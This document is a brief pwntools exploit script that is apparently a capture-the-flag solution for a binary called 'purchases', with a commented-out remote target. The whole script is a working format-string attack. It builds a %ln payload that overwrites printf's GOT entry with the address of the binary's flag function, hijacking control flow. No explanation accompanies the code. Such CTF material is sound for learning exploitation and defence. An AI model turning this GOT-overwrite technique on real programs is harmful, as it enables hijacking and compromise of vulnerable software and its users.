#coding=utf-8
from pwn import *

elf = ELF('./purchases')
printf_got = elf.symbols['got.printf']
flag = elf.symbols['flag']
#p = remote('shell.actf.co',19011)
p = process('./purchases')
p.recvuntil("purchase?")
p.sendline(("%%%dx%%10$ln"%flag).rjust(16)+p64(printf_got)[:3])
print p.recvall(1)
